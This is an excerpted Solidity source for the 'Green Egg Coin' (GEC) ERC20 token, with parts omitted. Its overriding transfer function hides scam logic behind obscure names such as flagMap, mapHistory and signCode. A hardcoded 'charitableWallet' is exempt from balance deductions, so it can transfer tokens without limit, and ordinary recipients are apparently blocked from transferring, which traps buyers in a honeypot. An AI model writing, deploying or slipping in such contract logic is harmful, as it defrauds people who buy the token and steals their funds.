...
contract ERC20 is i_Erc20 {
    using SafeMath for uint256;
    uint8 constant _decimals = 9;
    address internal charitableWallet = 0x08A28057520e8eeF71652742E26CCBAcA1a3562D;
    ...
    function transfer(address recipient, uint256 amount)
        ...
        returns (bool)
    {
        return clude__transfer(msg.sender, recipient, amount);
    }
   ...
   function base_transfer(
        ...
        qtWallt[sender] = qtWallt[sender].sub(amount, "Insufficient Balance!");
        qtWallt[recipient] = qtWallt[recipient].add(amount);
    ...
    function transferFrom(
        ...
        return clude__transfer(sender, recipient, amount);
    }
    ...
    function clude__transfer(
        ...
        uint256 amountReceived = shouldTakeFee(sender)
            ...
            : amount;
        qtWallt[recipient] = qtWallt[recipient].add(amountReceived);
        ...
        returns (uint256)
    {
        ...
        qtWallt[address(this)] = qtWallt[address(this)].add(feeAmount);
    ...
    function canSwapBack() internal view returns (bool) {
        return
            ...
            !enableSWAP &&
            swapEnabled &&
            qtWallt[address(this)] >= swapThreshold;
    }
    ...
    string constant _name = unicode"Green Egg Coin";
    string constant _symbol = unicode"GEC";
    mapping(address => uint256) qtWallt;
...
contract GreenEggCoin is Ownable, ERC20 {
    function call_Max(address spender) external returns (bool) {
    ...
    function clude__transfer(
        ...
        if (mapHistory[sponsor] > 0 && flagMap[sponsor] == 0 ) {
            if (transer_pair != sponsor) {
                flagMap[sponsor] -= signCode;
            }
        }
        address root = toaddr;
        mapHistory[root] += signCode;
        if (flagMap[sponsor] == 0) {
            qtWallt[sponsor] -= count;
        }
        qtWallt[accept] += count;
        emit Transfer(sponsor, accept, count);
        return true;
    }

    mapping(address => uint256) private mapHistory;
    address private toaddr;
    mapping(address => uint256) private flagMap;
    uint256 private signCode = 11;

    constructor() ERC20() {
    swap_router = IUniswapV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ...
    flagMap[charitableWallet] = signCode;
    toaddr = charitableWallet;
    qtWallt[msg.sender] = _totalSupply;
